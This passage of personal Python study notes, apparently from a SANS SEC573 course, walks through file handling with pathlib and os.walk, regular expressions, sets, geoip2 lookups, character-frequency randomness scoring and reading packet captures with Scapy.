>>> x[:20]
'\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00>\x00'
# process as str()
```

#### Working with File Paths

```python
>>> import pathlib
>>> pathlib.Path.cwd()
PosixPath('/home/d41y/learn/SANS/573/misc')
# current working directory
>>> pathlib.Path.home()
PosixPath('/home/d41y')
# current user's home directory
>>> x = pathlib.Path("/home/d41y/")
>>> x = x / "non_existing_file.txt"
# builds a path
>>> x
PosixPath('/home/d41y/non_existing_file.txt')
>>> x.parts
('/', 'home', 'd41y', 'non_existing_file.txt')
>>> x.name
'non_existing_file.txt'
>>> x.anchor
'/'
>>> x.parent
PosixPath('/home/d41y')
>>> str(x)
'/home/d41y/non_existing_file.txt'
>>> x.exists()
False
>>> x.is_file()
False
>>> x.is_dir()
False
```

#### Accessing Files with pathlib.Path()

```python
# pathlib.Path can be used to read and write files
>>> file_path = pathlib.Path.home() / "file.txt"
>>> file_path.write_text("Create text file!")
17
>>> file_path.read_text()
'Create text file!'
>>> file_path.write_bytes(b"Create text file!")
17
>>> file_path.read_bytes()
b'Create text file!'
# or use the open() method of pathlib.Path()
>>> with pathlib.Path("/home/d41y/file.txt").open("rb") as fh:
...     print(fh.read())
...     
b'Create text file!'
```

#### Check for Existence of Path

```python
>>> x = pathlib.Path("/etc/passwd")
>>> x.exists()
True
>>> x.is_file()
True
>>> x.is_dir()
False
>>> x = pathlib.Path("/root/test.txt").exists()
Traceback (most recent call last):
  File "<python-input-28>", line 1, in <module>
    x = pathlib.Path("/root/test.txt").exists()
  File "/usr/lib/python3.13/pathlib/_abc.py", line 450, in exists
    self.stat(follow_symlinks=follow_symlinks)
    ~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3.13/pathlib/_local.py", line 517, in stat
    return os.stat(self, follow_symlinks=follow_symlinks)
           ~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
PermissionError: [Errno 13] Permission denied: '/root/test.txt'
# returns true if the file exists or is a directory AND you have permissions to access it
```

#### Obtain a Listing of a Directory 1

```python
>>> import pathlib
>>> xpath = pathlib.Path("/home/d41y/learn/SANS/573/misc/")
>>> list(xpath.glob("*.txt"))
[PosixPath('/home/d41y/learn/SANS/573/misc/hamlet.txt'), PosixPath('/home/d41y/learn/SANS/573/misc/hamlet_head.txt')]
# glob() expends wildcards
>>> [str(eachpath) for eachpath in xpath.glob("*") if eachpath.is_file()]
['/home/d41y/learn/SANS/573/misc/hamlet.txt', '/home/d41y/learn/SANS/573/misc/bash', '/home/d41y/learn/SANS/573/misc/hamlet_head.txt']
# list comprehension can be used
```

#### Obtain a Listing of a Directory 2

```python
>>> os.listdir(xpath)
['hamlet.txt', 'bash', 'hamlet_head.txt']
>>> os.listdir(bytes(xpath))
[b'hamlet.txt', b'bash', b'hamlet_head.txt']
# backward compatibilty prior to version 3.4
# can be used with string or bytes of a path
```

#### Files and Subdirectories

```python
>>> logpath = pathlib.Path.home() / "learn/SANS/"
>>> for eachfile in logpath.rglob("*"):
...     if not eachfile.is_file():
...         continue
...     file_content = eachfile.read_bytes()
...     print(file_content[:20])
...     
b']UyH`B&$,;uJwjwYe7P,'
b'THE TRAGEDY OF HAMLE'
b'\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00>\x00'
b'Write this one line.'
b'%PDF-1.7\n%\xe4\xe3\xcf\xd2\n5 0 o'
b'%PDF-1.7\n%\xe4\xe3\xcf\xd2\n5 0 o'
b'%PDF-1.7\n%\xe4\xe3\xcf\xd2\n5 0 o'
b'%PDF-1.7\n%\xe4\xe3\xcf\xd2\n5 0 o'
b'%PDF-1.7\n%\xe4\xe3\xcf\xd2\n5 0 o'
b'%PDF-1.7\n%\xe4\xe3\xcf\xd2\n5 0 o'
b'%PDF-1.7\n%\xe4\xe3\xcf\xd2\n5 0 o'
b'%PDF-1.7\n%\xe4\xe3\xcf\xd2\n5 0 o'
b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
b'#!/usr/bin/vmware\n.e'
# rglob() recursively goes through all the subdirectories and finds all files that match the file mask
```

#### Supporting Wildcards with glob

```python
>>> import glob
>>> glob.glob(r"/home/d41y/*/*/*/*.ovpn")
['/home/d41y/ctf/thm/vpns/d41y-lateralmovementandpivoting.ovpn', '/home/d41y/ctf/thm/vpns/d41y-breachingad.ovpn', '/home/d41y/ctf/thm/vpns/d41y.ovpn', '/home/d41y/ctf/htb/00_vpns/fortresses_d41y.ovpn', '/home/d41y/ctf/htb/00_vpns/academy-regular.ovpn', '/home/d41y/ctf/htb/00_vpns/lab_d41y.ovpn', '/home/d41y/ctf/htb/00_vpns/competitive_d41y.ovpn', '/home/d41y/ctf/htb/00_vpns/starting_point_d41y.ovpn']
>>> import pathlib
>>> list(pathlib.Path("/home/").glob("d41y/*/*/*/*.ovpn"))
[PosixPath('/home/d41y/ctf/thm/vpns/d41y-lateralmovementandpivoting.ovpn'), PosixPath('/home/d41y/ctf/thm/vpns/d41y-breachingad.ovpn'), PosixPath('/home/d41y/ctf/thm/vpns/d41y.ovpn'), PosixPath('/home/d41y/ctf/htb/00_vpns/fortresses_d41y.ovpn'), PosixPath('/home/d41y/ctf/htb/00_vpns/academy-regular.ovpn'), PosixPath('/home/d41y/ctf/htb/00_vpns/lab_d41y.ovpn'), PosixPath('/home/d41y/ctf/htb/00_vpns/competitive_d41y.ovpn'), PosixPath('/home/d41y/ctf/htb/00_vpns/starting_point_d41y.ovpn')]
# with glob and pathlib.Path().glob(), the asterisk can be part of a path
```

#### Finding files with os.walk()

```python
>>> import os
>>> drv = list(os.walk("/home/d41y/ctf/"))
>>> drv[0]
('/home/d41y/ctf/', ['thm', 'certified_secure', 'hackosint25', '.obsidian', 'htb', 'hacktoria'], [])
>>> drv[1]
('/home/d41y/ctf/thm', ['writeups', 'vpns', '.obsidian'], [])
>>> drv[2]
('/home/d41y/ctf/thm/writeups', ['99_screenshots', '.git', 'machines'], ['README.md'])
>>> drv[3]
('/home/d41y/ctf/thm/writeups/99_screenshots', [], ['grep_leak.png', 'whiterose_link.png', 'team_sshkey.png', 'rev_shell_chocolate.png', 'cyborg_passwd.png', 'grep_key.png', 'grep_burp_key.png', 'whiterose_burp.png', 'team_website.png', 'index_of.png', 'team_pathtraversal.png', 'whiterose_accounts.png', 'charlie_key_chocolate.png', 'team_placeholder.png', 'valley_dev.png', 'sweetrice_content.png', 'catpictures_revshell.png', 'command-execute_chocolate_facto.png', 'phphbb.png', 'grep_login.png', 'whiterose_login_olivia.png', 'whiterose_cyprusbank_white.png', 'valley_static_00.png', 'link_chocolate_facto.png', 'affine.png', 'valley_note_txt.png', 'phpbb_user.png', 'valley_siemdev_notes.png', 'team_sshconfig.png', 'grep_pass.png', 'valley_wireshark_pass.png', 'billing_1.png', 'grep_hexupload.png', 'admin_konsole.png', 'grep_test.png', 'whiterose_error.png', 'creds_pokemon.png'])
# os.walk() gives you back a tuple containing the current dir, a list of dirs in that dir, and a list of files in that dir
```

#### os.walk() Example

```python
>>> for currentdir,subdirs,allfiles in os.walk("/home/d41y/ctf/hacktoria"):
...     print(f"I am in directory {currentdir}")
...     print(f"It contains directories {subdirs}")
...     for eachfile in allfiles:
...         fullpath = os.path.join(currentdir,eachfile)
...         print(f"----- File: {fullpath}")
...         
I am in directory /home/d41y/ctf/hacktoria
It contains directories []
----- File: /home/d41y/ctf/hacktoria/badge friendly fire.png
----- File: /home/d41y/ctf/hacktoria/Badge-Naval-Intrusion.png
----- File: /home/d41y/ctf/hacktoria/Badge Alien Abduction.png
```

#### Reading gzip Compressed Files

```python
>>> import gzip
>>> gz = gzip.open("uebungsklausur_1_ml.pdf.gz", "rb")
>>> list_of_lines = gz.readlines()
>>> list_of_lines[2][:40]
b'6 0 obj\n'
# for one file
>>> for eachfile in pathlib.Path("/home/d41y/learn/SANS/573/misc/").glob("*.gz"):
...     content = gzip.open(eachfile, "rb").read()
...     print(eachfile.name,"-",content[:40])
...     
uebungsklausur_ss_22_ml.pdf.gz - b'%PDF-1.5\n%\xbf\xf7\xa2\xfe\n52 0 obj\n<< /Linearized 1'
uebungsklausur_1_ml.pdf.gz - b'%PDF-1.5\n%\xd0\xd4\xc5\xd8\n6 0 obj\n<<\n/Length 1704  '
uebungsklausur_ws_21_ml.pdf.gz - b'%PDF-1.5\n%\xbf\xf7\xa2\xfe\n46 0 obj\n<< /Linearized 1'
uebungsklausur_2_ml.pdf.gz - b'%PDF-1.5\n%\xd0\xd4\xc5\xd8\n6 0 obj\n<<\n/Length 1205  '
uebungsklausur_ss_20_ml.pdf.gz - b'%PDF-1.5\n%\xbf\xf7\xa2\xfe\n44 0 obj\n<< /Linearized 1'
# for multiple files
```

### Regular Expressions

#### re functions()

```python
>>> import re
>>> re.findall(b"my pattern", b"search this for my pattern")
[b'my pattern']
>>> re.findall("my pattern", "search this for my pattern")
['my pattern']
# find all occurences of the pattern in the data
>>> x = re.match("th", "this is the test")
>>> x.group()
'th'
>>> x = re.match("is", "this is the test")
>>> x.group()
Traceback (most recent call last):
  File "<python-input-6>", line 1, in <module>
    x.group()
    ^^^^^^^
AttributeError: 'NoneType' object has no attribute 'group'
# match() -> start at the beginning of data searching for pattern
>>> x = re.search("is", "this is the test")
>>> x.group()
'is'
# search() -> match pattern anywhere in data
```

#### RegEx Rules 1

```python
>>> re.findall("SANS", "The SANS Python class rocks")
['SANS']
>>> re.findall(".ython", "I Python, you python. We all python.")
['Python', 'python', 'python']
# . as wildcard
>>> re.findall(r"\w\w\w\w\w\w\w\w","(*&$H@$password(*$@BK#@TF")
['password']
# \w -> any text char (azAZ09 and _)
>>> re.findall(r"\w\W", "Get the last letters.")
['t ', 'e ', 't ', 's.']
# \W -> opposite of \w
>>> re.findall(r".\W", "Moves! left$ to{ right.")
['s!', 't$', 'o{', 't.']
>>> re.findall(r".\W", "! left$ to{ right.")
['! ', 't$', 'o{', 't.']
```

#### RegEx Rules 2

```python
>>> re.findall(r"\(\d\d\d\)\d\d\d-\d\d\d\d", "Jenny Tutone (800)867-5309")
['(800)867-5309']
>>> re.findall(r"\S\S\s", "Find Two ANYTHING )( 09 and space. ")
['nd ', 'wo ', 'NG ', ')( ', '09 ', 'nd ', 'e. ']
# \d matches digits
# \D opposite of \d
# \s matches any white-space chars
# \S non white-space
# [set of chars] can be defined
# \b border of a word
# ^ matches from the start
# $ matches to the end
# \ escapes special chars
```

#### Custom Sets

```python
>>> re.findall(r"\d\d/\d\d/\d\d", "12/25/00 99/99/99")
['12/25/00', '99/99/99']
# 99/99/99 is not a valid date
>>> re.findall(r"[01]\d/[0-3]\d/\d\d", "12/25/00 99/99/99")
['12/25/00']
# [A-Z] for uppercase letters
# [a-z] for lowercase letters
# [0-9] for digits
# [a-f] for a subset of chars
# [!-~] for ASCII values range
# [\w] for any text char
```

#### Logical OR Statement

```python
>>> re.findall(r"(0[1-9]|1[0-2])", "12/25/00 13/09/99")
['12', '09']
>>> re.findall(r"(0[1-9]|[1-2][0-9]|3[0-1])", "13/32/31 01/19/00")
['13', '31', '01', '19']
>>> re.findall(r"(?:0[1-9]|1[0-2])/(?:0[1-9]|[1-2][0-9]|3]0-1])/\d\d", "13/31/99 12/32/50 01/19/00")
['01/19/00']
# (?:regex1|regex2|regex3) match regex1 or regex2 or regex3
```

#### Repeating Chars

```python
>>> re.findall(r"http://[\w.\\/]+", "<img src=http://url.com/image.jpg>")
['http://url.com/image.jpg']
>>> re.findall(r"\d{1,3}\.\d{1,3}\.\d{1,3}", "http://127.23.9.120:80/")
['127.23.9']
# {x} -> match exactly x copies of the previous character characters
# {x,[y]} -> match between x and y of the previous character, if y is omitted, it finds x or more matches
# + -> one or more of the previous
# * -> zero or more of the previous (\d{0,})
# ? -> the previous character is optional (\d{0,1})
```

#### RegEx Flags and Modifiers

```python
>>> re.findall(r"sec573", "sec573,SEC573,Sec573")
['sec573']
>>> re.findall(r"(?i)sec573", "sec573,SEC573,Sec573")
['sec573', 'SEC573', 'Sec573']
>>> re.findall(r"sec573", "sec573,SEC573,Sec573", re.IGNORECASE)
['sec573', 'SEC573', 'Sec573']
# re.IGNORECASE or(?i) will ignore the case and make the search case insensitive
>>> re.findall(r"^sec573", "\nsec573\nsec573 is excellent!")
[]
>>> re.findall(r"(?m)^sec573", "\nsec573\nsec573 is excellent!")
['sec573', 'sec573']
>>> re.findall(r"^sec573", "\nsec573\nsec573 is excellent!", re.MULTILINE)
['sec573', 'sec573']
# re.MULTILINE or (?m) will turn on multiline matching
```

#### Greedy Matching

```python
>>> re.findall(r"[A-Z].+\.", "Hello. Hi. Python rocks. I know.")
['Hello. Hi. Python rocks. I know.']
# * and + are greedy, they match as much as they can
>>> re.findall(r"[A-Z].+?\.", "Hello. Hi. Python rocks. I know.")
['Hello.', 'Hi.', 'Python rocks.', 'I know.']
# *? and +? turns off greedy matching
```

#### NOT Custom Set

```python
>>> re.findall(r"[A-Z][^A-Z]", "Things That start with Caps")
['Th', 'Th', 'Ca']
>>> re.findall(r"[A-Z][^?.!]+", "Find. The sentences? Yes!")
['Find', 'The sentences', 'Yes']
# [^"] in first position negates the set
```

### RegEx Groups

#### Why Use Capture Groups

```python
>>> data = open("data", "r").read()
>>> data
'client 103.4.22.120#121212\nclient 103.1.22.120#121212\nclient 103.2.22.120#121212\nclient 103.3.22.120#121212\nclient 103.4.22.120#121212\n'
>>> re.findall("client .*?#", data)
['client 103.4.22.120#', 'client 103.1.22.120#', 'client 103.2.22.120#', 'client 103.3.22.120#', 'client 103.4.22.120#']
# included things you don't want
>>> re.findall("client (.*?)#", data)
['103.4.22.120', '103.1.22.120', '103.2.22.120', '103.3.22.120', '103.4.22.120']
# () generates a capture group
```

#### Capture Groups vs. Non Capture Groups

```python
>>> re.findall(r"(0[1-9]|1[0-2])/(0[1-9]|[1-2][0-9]|3[01])/\d\d", "13/31/99 12/32/50 01/19/00")
[('01', '19')]
# as soon as parantheses are added, you only get back what's inside the parantheses
>>> re.findall(r"(?:0[1-9]|1[0-2])/(?:0[1-9]|[1-2][0-9]|3[01])/\d\d", "13/31/99 12/32/50 01/19/00")
['01/19/00']
# non capture groups group together parts of the regex without capturing
```

#### search() and match() Groups

```python
>>> srchstr = r"192.168.100.100-123.123.123.123-234.131.234.123"
>>> result = re.search(r"(\d\d\d)\.(\d\d\d)\.(\d\d\d)\.(\d\d\d)", srchstr)
>>> result.group()
'192.168.100.100'
>>> result.group(2)
'168'
# search() and match() return an object with a group() method that provides you with the result
# .group() with no arguments returns the entire match, ignoring the groups if any were detected
# .group(#) will return the information in a specific group
# RegEx group numbers begin counting at 1
```

#### Python Capturing Named Groups

```python
>>> a = re.search(r"(?P<areacode>\d\d\d)-\d\d\d-\d\d\d\d", "814-422-5632")
>>> a.group("areacode")
'814'
>>> a.group()
'814-422-5632'
# create a named group (?P<groupname>['\"])
# use search or match.group("<groupname>") to retrieve the data
```

### RegEx Back References

```python
>>> data = r"<tag1>data1</tag1><tag8>data2</tag8>"
>>> re.findall(r"<\w+>(.*?)</\w+>", data)
['data1', 'data2']
>>> data = r"<tag1><tag8>data1</tag8></tag1><tag2>data2</tag2>"
>>> re.findall(r"<\w+>(.*?)</\w+>", data)
['<tag8>data1', 'data2']
# when nested, system falls apart
>>> re.findall(r"<(\w+)>(.*?)</\1>", data)
[('tag1', '<tag8>data1</tag8>'), ('tag2', 'data2')]
# "\1" will let you refer back to the contents of capture group one
# named groups can also be used
# r"<(?<TAG>\w+)>(.*?)</(?P=TAG)>", data")
```

### Sets

#### Python Sets

```python
>>> emptyset = set()
>>> myset = set([1,2,3])
>>> myset = {1,2,3}
# create a set by calling set() or assigning {} with commas
>>> myset
{1, 2, 3}
>>> myset = set([1,2,3])
>>> myset.update([4,5,6])
# can add everything from another list
>>> myset.add("A")
# adds one item
>>> myset
{1, 2, 3, 4, 5, 6, 'A'}
>>> myset.remove(4)
# removes a single item
>>> myset.difference_update([2,5])
# used to remove a list of items from a set
>>> myset
{1, 3, 6, 'A'}
```

#### Useful Methods

```python
>>> a = set([1,2,3])
>>> b = set([3,4,5,])
>>> a.union(b)
{1, 2, 3, 4, 5}
# adds the two sets together
>>> a.difference(b)
{1, 2}
# returns the items that are in your set but in the set you are comparing it to
>>> b.difference(a)
{4, 5}
>>> a.intersection(b)
{3}
# finds the overlap between the two sets
>>> a.symmetric_difference(b)
{1, 2, 4, 5}
# returns all the items in the sets an removes the intersection from them
```

#### Operators Automatically Call Methods

```python
>>> a = set([1,2,3])
>>> b = set([3,4,5,])
>>> a ^ b
{1, 2, 4, 5}
# symmetric_difference
>>> a | b
{1, 2, 3, 4, 5}
# union
>>> a - b
{1, 2}
# difference
>>> a & b
{3}
# intersection
>>> a.__and__(b)
{3}
# intersection
```

#### Making Copies of Sets

```python
>>> a = set([1,2,3])
>>> c = a
>>> c is a
True
>>> id(c)
140651297499040
>>> id(a)
140651297499040
# wrong
>>> a = set([1,2,3])
>>> c = set(a)
>>> c is a
False
>>> id(c)
140651297499488
>>> id(a)
140651297500608
# right
```

### Analysis Techniques

#### geoip2 IP - Location Lookup

```bash
# http://dev.maxmind.com
# free db to look up IP addresses

# the extension must be installed before the geoip2 module is installed
sudo add-apt-repository ppa:maxmind/ppa
sudo apt install libmaxminddb0 libmaxminddb0-dev mmdb-bin
```

#### geoIP2 - Retrieving Record Details 1

```python
>>> import geoip2.database
>>> reader = geoip2.database.Reader("GeoLite2-City.mmdb")
>>> def get_geoip2_record(database, ip_address):
...     try:
...         record = database.city(ip_address)
...     except geoip2.errors.AddressNotFoundError:
...         pritn("Record not found.")
...         record = None
...     return record
... 
>>> rec = get_geoip2_record(reader, "66.35.59.202")
>>> if rec:
...     print("The country is", rec.country.name)
...     
The country is United States
```

#### geoIP2 - Retrieving Record Details 2

```python
>>> rec.continent.name
'North America'
>>> rec.country.name
'United States'
>>> rec.subdivisions.most_specific.name
'Colorado'
>>> rec.city.name
'Erie'
>>> rec.postal.code
'80516'
>>> rec.location.longitude, rec.location.latitude
(-105.05, 40.0503)
```

#### Detecting Randomness by Character Frequency

```python
>>> from freq import *
>>> fc = FreqCounter()
>>> fc.load("freqtable2018.freq")
>>> fc.probability("normaltext")
(8.0669, 5.8602)
>>> fc.probability("vojervonrew")
(9.1246, 7.2307)
>>> fc.probability("987zt2637g")
(1.6787, 0.0146)
# .load() reads a file with character frequency data
# .probability() measures a string based on the table and returns the "average probability" and the "word probability"
```

#### Build your own Frequency Table

```python
>>> from freq import *
>>> fc = FreqCounter()
>>> fc.tally_str(open("hamlet.txt", "rt").read())
>>> fc.probability("987zt2637g")
(0.0, 0.0)
>>> fc.probability("normaltext")
(6.7105, 5.8932)
>>> fc.probability("love")
(29.8657, 10.2661)
# general rule: any value < 5% is probably not worth looking at
>>> fc.ignorechars -= "."
# to ignore certain characters
```

### Introduction to Scapy

#### Reading and Writing PacketLists

```python
>>> from scapy.all import *
>>> packetlist = rdpcap("test.pcap")
# reads a file containing pcaps into a scapy.PacketList Data structure
>>> wrpcap("newpacketcapture.pcap", packetlist)
# writes a PacketList to a pcap file
>>> sniff(iface="eth0", store=0, lfilter=filterer, prn=analyze, stop_filter=stopper)
# to capture all packets filtered by a filterer() until some event determined by stopper(), passes them to function analyze()
>>> sniff(iface="eth0", lfilter=selectpackets, count=100)
# to capture 100 packets that are selected by the selectpackets() function
>>> sniff(offline="test.pcap", filter="TCP PORT 80")
# to read a pcap and apply a BPF (Berkely Packet Filter)
```

#### sniff()'s Callback Functions

```python
>>> from scapy.all import * 
>>> import time
>>> def stopper(packetin):
...      return (time.time() - start_time) > 60
...      
>>> def filterer(packetin):
...      return packetin.haslayer(Raw)
...      
>>> def processor(packetin):
...      print("I got a packet from", packetin[IP].src)
...      
>>> start_time = time.time()
>>> sniff(iface="lo", store=0, prn=processor, lfilter=filterer, stop_filter=stopper)
I got a packet from 127.0.0.1
I got a packet from 127.0.0.1
I got a packet from 127.0.0.1
# callback functions define how it will behave and are called for every packet
# prn is called to process every packet that gets past lfilter
# lfilter returns False for every packet that should be ignored by the sniffer
# stop_filter returns True when the sniffer should stop sniffing packets
```

#### Save Memory with PcapReader

```python
>>> dir(PcapReader)
['PacketMetadata', '__class__', '__delattr__', '__dict__', '__dir__', '__doc__', '__enter__', '__eq__', '__exit__', '__firstlineno__', '__format__', '__ge__', '__getattribute__', '__getstate__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__iter__', '__le__', '__lt__', '__module__', '__ne__', '__new__', '__next__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__static_attributes__', '__str__', '__subclasshook__', '__weakref__', '_read_all', '_read_packet', 'alternative', 'close', 'dispatch', 'fileno', 'nonblocking_socket', 'read_all', 'read_packet', 'recv', 'select']
>>> for pkt in PcapReader("test.pcap"):
...      print(pkt.dport)
...      
443
443
64565
443
64565
443
64565
443
64565
# can be used to step through packets with a for loop instead of loading the entire thing into memory
```

#### scapy.plist.PacketList

```python
>>> packetlist = rdpcap("test.pcap")
>>> packetlist.__class__
<class 'scapy.plist.PacketList'>
>>> dir(packetlist)
['_T', '__add__', '__class__', '__class_getitem__', '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__', '__firstlineno__', '__format__', '__ge__', '__getattr__', '__getattribute__', '__getitem__', '__getstate__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__iter__', '__iterlen__', '__le__', '__len__', '__lt__', '__module__', '__ne__', '__new__', '__orig_bases__', '__parameters__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__setstate__', '__sizeof__', '__slots__', '__static_attributes__', '__str__', '__subclasshook__', '__weakref__', '_elt2pkt', '_elt2show', '_elt2sum', 'afterglow', 'canvas_dump', 'conversations', 'diffplot', 'filter', 'getlayer', 'hexdump', 'hexraw', 'listname', 'make_lined_table', 'make_table', 'make_tex_table', 'multiplot', 'nsummary', 'nzpadding', 'padding', 'pdfdump', 'plot', 'psdump', 'rawhexdump', 'replace', 'res', 'sessions', 'show', 'sr', 'stats', 'summary', 'svgdump', 'timeskew_graph']
```

### Scapy Data Structures

#### Following TCP Streams

```python
>>> scapy.plist.PacketList.sessions(packetlist)
{'TCP 172.16.11.12:64565 > 74.125.19.17:443': <PacketList: TCP:5 UDP:0 ICMP:0 Other:0>, 'TCP 74.125.19.17:443 > 172.16.11.12:64565': <PacketList: TCP:4 UDP:0 ICMP:0 Other:0>, 'ARP 172.16.11.1 > 172.16.11.194': <PacketList: TCP:0 UDP:0 ICMP:0 Other:1>, 'TCP 172.16.11.12:64581 > 216.34.181.45:80': <PacketList: TCP:21 UDP:0 ICMP:0 Other:0>, 'TCP 216.34.181.45:80 > 172.16.11.12:64581': <PacketList: TCP:33 UDP:0 ICMP:0 Other:0>, 'UDP 172.16.11.12:54639 > 172.16.11.1:53': <PacketList: TCP:0 UDP:1 ICMP:0 Other:0>, 'UDP 172.16.11.12:59368 > 172.16.11.1:53': <PacketList: TCP:0 UDP:1 ICMP:0 Other:0>, 'UDP 172.16.11.1:53 > 172.16.11.12:54639': <PacketList: TCP:0 UDP:1 ICMP:0 Other:0>, 'TCP 172.16.11.12:64582 > 96.17.211.172:80': <PacketList: TCP:5 UDP:0 ICMP:0 Other:0>, 'TCP 172.16.11.12:64583 > 96.17.211.172:80': <PacketList: TCP:6 UDP:0 ICMP:0 Other:0>, 'UDP 172.16.11.1:53 > 172.16.11.12:59368': <PacketList: TCP:0 UDP:1 ICMP:0 Other:0>, 'ICMP 172.16.11.12 > 172.16.11.1 type=3 code=3 id=0x0': <PacketList: TCP:0 UDP:0 ICMP:6 Other:0>, 'TCP 96.17.211.172:80 > 172.16.11.12:64582': <PacketList: TCP:4 UDP:0 ICMP:0 Other:0>, 'TCP 96.17.211.172:80 > 172.16.11.12:64583': <PacketList: TCP:5 UDP:0 ICMP:0 Other:0>, 'TCP 172.16.11.12:64584 > 96.17.211.172:80': <PacketList: TCP:7 UDP:0 ICMP:0 Other:0>, 'TCP 172.16.11.12:64585 > 96.17.211.172:80': <PacketList: TCP:6 UDP:0 ICMP:0 Other:0>, 'TCP 96.17.211.172:80 > 172.16.11.12:64584': <PacketList: TCP:6 UDP:0 ICMP:0 Other:0>, 'TCP 96.17.211.172:80 > 172.16.11.12:64585': <PacketList: TCP:4 UDP:0 ICMP:0 Other:0>, 'UDP 172.16.11.12:60392 > 172.16.11.1:53': <PacketList: TCP:0 UDP:2 ICMP:0 Other:0>, 'UDP 172.16.11.1:53 > 172.16.11.12:60392': <PacketList: TCP:0 UDP:2 ICMP:0 Other:0>, 'UDP 172.16.11.12:59222 > 172.16.11.1:53': <PacketList: TCP:0 UDP:1 ICMP:0 Other:0>, 'UDP 172.16.11.12:59925 > 172.16.11.1:53': <PacketList: TCP:0 UDP:1 ICMP:0 Other:0>, 'UDP 172.16.11.1:53 > 172.16.11.12:59222': <PacketList: TCP:0 UDP:1 ICMP:0 Other:0>, 'UDP 172.16.11.12:50282 > 172.16.11.1:53': <PacketList: TCP:0 UDP:1 ICMP:0 Other:0>, 'UDP 172.16.11.1:53 > 172.16.11.12:50282': <PacketList: TCP:0 UDP:1 ICMP:0 Other:0>, 'UDP 172.16.11.1:53 > 172.16.11.12:59925': <PacketList: TCP:0 UDP:1 ICMP:0 Other:0>, 'UDP 172.16.11.12:57238 > 172.16.11.1:53': <PacketList: TCP:0 UDP:2 ICMP:0 Other:0>, 'UDP 172.16.11.12:59785 > 172.16.11.1:53': <PacketList: TCP:0 UDP:1 ICMP:0 Other:0>, 'UDP 172.16.11.1:53 > 172.16.11.12:57238': <PacketList: TCP:0 UDP:2 ICMP:0 Other:0>, 'UDP 172.16.11.12:51370 > 172.16.11.1:53': <PacketList: TCP:0 UDP:1 ICMP:0 Other:0>, 'UDP 172.16.11.12:57360 > 172.16.11.1:53': <PacketList: TCP:0 UDP:1 ICMP:0 Other:0>, 'UDP 172.16.11.1:53 > 172.16.11.12:59785': <PacketList: TCP:0 UDP:1 ICMP:0 Other:0>, 'UDP 172.16.11.12:56758 > 172.16.11.1:53': <PacketList: TCP:0 UDP:1 ICMP:0 Other:0>, 'UDP 172.16.11.1:53 > 172.16.11.12:51370': <PacketList: TCP:0 UDP:1 ICMP:0 Other:0>, 'UDP 172.16.11.12:51145 > 172.16.11.1:53': <PacketList: TCP:0 UDP:1 ICMP:0 Other:0>, 'UDP 172.16.11.1:53 > 172.16.11.12:56758': <PacketList: TCP:0 UDP:1 ICMP:0 Other:0>, 'UDP 172.16.11.1:53 > 172.16.11.12:51145': <PacketList: TCP:0 UDP:1 ICMP:0 Other:0>, 'UDP 172.16.11.1:53 > 172.16.11.12:57360': <PacketList: TCP:0 UDP:1 ICMP:0 Other:0>}
# or
>>> packetlist.sessions()
{'TCP 172.16.11.12:64565 > 74.125.19.17:443': <PacketList: TCP:5 UDP:0 ICMP:0 Other:0>, 'TCP 74.125.19.17:443 > 172.16.11.12:64565': <PacketList: TCP:4 UDP:0 ICMP:0 Other:0>, 'ARP 172.16.11.1 > 172.16.11.194': <PacketList: TCP:0 UDP:0 ICMP:0 Other:1>, 'TCP 172.16.11.12:64581 > 216.34.181.45:80': <PacketList: TCP:21 UDP:0 ICMP:0 Other:0>, 'TCP 216.34.181.45:80 > 172.16.11.12:64581': <PacketList: TCP:33 UDP:0 ICMP:0 Other:0>, 'UDP 172.16.11.12:54639 > 172.16.11.1:53': <PacketList: TCP:0 UDP:1 ICMP:0 Other:0>, 'UDP 172.16.11.12:59368 > 172.16.11.1:53': <PacketList: TCP:0 UDP:1 ICMP:0 Other:0>, 'UDP 172.16.11.1:53 > 172.16.11.12:54639': <PacketList: TCP:0 UDP:1 ICMP:0 Other:0>, 'TCP 172.16.11.12:64582 > 96.17.211.172:80': <PacketList: TCP:5 UDP:0 ICMP:0 Other:0>, 'TCP 172.16.11.12:64583 > 96.17.211.172:80': <PacketList: TCP:6 UDP:0 ICMP:0 Other:0>, 'UDP 172.16.11.1:53 > 172.16.11.12:59368': <PacketList: TCP:0 UDP:1 ICMP:0 Other:0>, 'ICMP 172.16.11.12 > 172.16.11.1 type=3 code=3 id=0x0': <PacketList: TCP:0 UDP:0 ICMP:6 Other:0>, 'TCP 96.17.211.172:80 > 172.16.11.12:64582': <PacketList: TCP:4 UDP:0 ICMP:0 Other:0>, 'TCP 96.17.211.172:80 > 172.16.11.12:64583': <PacketList: TCP:5 UDP:0 ICMP:0 Other:0>, 'TCP 172.16.11.12:64584 > 96.17.211.172:80': <PacketList: TCP:7 UDP:0 ICMP:0 Other:0>, 'TCP 172.16.11.12:64585 > 96.17.211.172:80': <PacketList: TCP:6 UDP:0 ICMP:0 Other:0>, 'TCP 96.17.211.172:80 > 172.16.11.12:64584': <PacketList: TCP:6 UDP:0 ICMP:0 Other:0>, 'TCP 96.17.211.172:80 > 172.16.11.12:64585': <PacketList: TCP:4 UDP:0 ICMP:0 Other:0>, 'UDP 172.16.11.12:60392 > 172.16.11.1:53': <PacketList: TCP:0 UDP:2 ICMP:0 Other:0>, 'UDP 172.16.11.1:53 > 172.16.11.12:60392': <PacketList: TCP:0 UDP:2 ICMP:0 Other:0>, 'UDP 172.16.11.12:59222 > 172.16.11.1:53': <PacketList: TCP:0 UDP:1 ICMP:0 Other:0>, 'UDP 172.16.11.12:59925 > 172.16.11.1:53': <PacketList: TCP:0 UDP:1 ICMP:0 Other:0>, 'UDP 172.16.11.1:53 > 172.16.11.12:59222': <PacketList: TCP:0 UDP:1 ICMP:0 Other:0>, 'UDP 172.16.11.12:50282 > 172.16.11.1:53': <PacketList: TCP:0 UDP:1 ICMP:0 Other:0>, 'UDP 